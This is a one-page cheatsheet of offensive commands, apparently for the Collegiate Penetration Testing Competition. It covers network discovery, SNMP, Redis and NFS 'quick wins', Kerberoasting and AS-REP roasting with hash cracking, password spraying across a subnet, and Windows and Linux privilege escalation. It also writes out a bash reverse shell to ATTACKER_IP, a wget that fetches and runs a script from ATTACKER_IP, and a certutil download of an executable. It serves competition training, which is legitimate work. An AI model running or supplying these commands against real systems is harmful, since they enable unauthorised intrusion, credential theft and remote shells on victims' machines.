# CPTC Quick Reference - One Page Cheatsheet

## Launch Everything

```bash
# Network discovery
nmap -sn 10.10.10.0/24 -oG - | grep Up | cut -d' ' -f2 > targets.txt

# Start AutoRecon (background)
autorecon -t targets.txt -o ~/results/ &

# Quick wins check
sudo nmap -sU -p161 --open -iL targets.txt  # SNMP
nmap -p6379 --open -iL targets.txt           # Redis  
nmap -p2049,111 --open -iL targets.txt       # NFS
```

## High-Frequency Quick Wins

| Service | Command | Time | Impact |
|---------|---------|------|--------|
| SNMP | `snmpwalk -v2c -c public TARGET \| grep password` | 5min | Credentials |
| Redis | `redis-cli -h TARGET ping` → SSH key injection | 2min | Root |
| NFS | `showmount -e TARGET` → Mount /home | 10min | SSH keys |
| MySQL | `mysql -h TARGET -u root` | 3min | Database |
| SMB Signing | `netexec smb DC_IP --gen-relay-list relay.txt` | 15min | Domain Admin |

## Active Directory (With Domain Creds)

```bash
# All in one (10 minutes):
netexec smb DC_IP --gen-relay-list relay.txt && \
impacket-GetNPUsers DOMAIN/USER:PASS -dc-ip DC_IP -request -o asrep.txt && \
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -o kerberoast.txt && \
bloodhound-python -u USER -p 'PASS' -d DOMAIN -ns DC_IP -c All --zip && \
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt & \
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt &
```

## Web Application Tests

```bash
# Quick enum (5 min):
curl http://TARGET/.git/config; curl http://TARGET/.env
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50

# SQL injection test:
curl "http://TARGET/page.php?id=1'"  # Error message?
```

## Credential Testing

```bash
# Test password EVERYWHERE (critical!):
PASS="FoundPassword123!"
netexec smb 10.10.10.0/24 -u admin -p "$PASS" && \
netexec ssh 10.10.10.0/24 -u admin -p "$PASS" && \
netexec mssql 10.10.10.0/24 -u sa -p "$PASS" && \
netexec winrm 10.10.10.0/24 -u administrator -p "$PASS"
```

## Linux Privilege Escalation

```bash
sudo -l  # Check FIRST!
id  # Docker/LXD group?
find / -perm -4000 -type f 2>/dev/null  # SUID
wget http://ATTACKER_IP/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

## Windows Privilege Escalation

```powershell
whoami /priv  # SeImpersonate?
.\PrintSpoofer.exe -i -c cmd  # Instant SYSTEM

# Check AlwaysInstallElevated:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Shells & Listeners

```bash
# Listener
rlwrap nc -lvnp 4444

# Bash reverse shell
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Stabilize
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z, then: stty raw -echo; fg
```

## File Transfer

```bash
# Serve (Kali)
python3 -m http.server 80

# Download (Linux)
wget http://ATTACKER_IP/file

# Download (Windows)
certutil -urlcache -f http://ATTACKER_IP/file.exe file.exe
```

## Priority Order

1. SNMP/Redis/NFS (instant wins)
2. Default credentials everywhere
3. AD attacks (if domain)
4. Web SQLi/file upload
5. Privesc on shells
6. Deep dives (if time)

## Port → Tool Map

```
22   SSH    → hydra, keys
80   HTTP   → gobuster, Burp
139  SMB    → netexec, enum4linux
161  SNMP   → snmpwalk -c public
389  LDAP   → ldapsearch
445  SMB    → netexec
1433 MSSQL  → mssqlclient
2049 NFS    → showmount
3306 MySQL  → mysql -u root
3389 RDP    → netexec rdp
5985 WinRM  → evil-winrm
6379 Redis  → redis-cli
```

## Useful Sites

GTFOBins: https://gtfobins.github.io/
LOLBAS: https://lolbas-project.github.io/
PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
RevShells: https://www.revshells.com/
CyberChef: https://gchq.github.io/CyberChef/
CrackStation: https://crackstation.net/
